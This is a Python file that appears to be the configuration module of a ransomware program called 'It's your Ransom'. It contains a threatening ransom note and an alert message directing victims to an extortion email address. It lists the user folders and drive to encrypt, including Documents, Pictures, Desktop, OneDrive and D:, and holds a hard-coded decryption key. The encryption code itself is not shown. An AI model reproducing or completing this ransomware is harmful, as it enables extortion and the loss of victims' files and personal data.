import os

#  the variables and files for (@its your ransom.py)


ransom_file = """
     - English
     Your files have been encrypted!
     Don't try to change file name or move any file or change anything in the files
     there is a chance you lose all your data and memories if you touched any file
     decrypt steps is easy
     just send a message on the E-Mail ↓ with your phone number
     fortestramsom@gmail.com
     and we will contact you to make a deal and give you a Decryption Key
     after getting the Key, open this app again and enter the Key and wait. your files will be decrypted
     all your files will be on the normal mode before the encryption
     just keep with us and everything will be okay
     Remember; any try to decrypt or touch the files or the app by yourself. you will be SAD
     be calm, stay with us. and everything will be okay.
     except; your memories will BURN.
     dont remove or move or delete any new files appears or you will be very sad.
     (DONT TOUCH ANYTHING YOU DONT KNOW)
"It's your Ransom"
E-Mail: fortestramsom@gmail.com


"""




ransom_message = """
=========================================================
ALERT: Your files have been fully encrypted!
Contact (fortestramsom@gmail.com) to decrypt them.
=========================================================

============================================
Alert:
Dont try to touch the files
============================================

You can exit until you get the Key
"""

user_folder = os.path.expanduser("~")

directories1 = [
    os.path.join(user_folder, "Downloads"),
    os.path.join(user_folder, "Videos"),
    os.path.join(user_folder, "Pictures"),
    os.path.join(user_folder, "Documents"),
    os.path.join(user_folder, "Music"),
    os.path.join(user_folder, "OneDrive"),
    os.path.join(user_folder, "Desktop"),
    'D:/'
]  # Directories of encrypted files

directories = [d for d in directories1 if os.path.isdir(d)]

dCode = "c41SqqB62dgIi7posUI156HE0hD7v838ja1o"  #   The Decryption Key

decryption_message = """
    Good Boy! Your files have been decrypted!
    Take care next time :>
"It's your Ransom"


        """


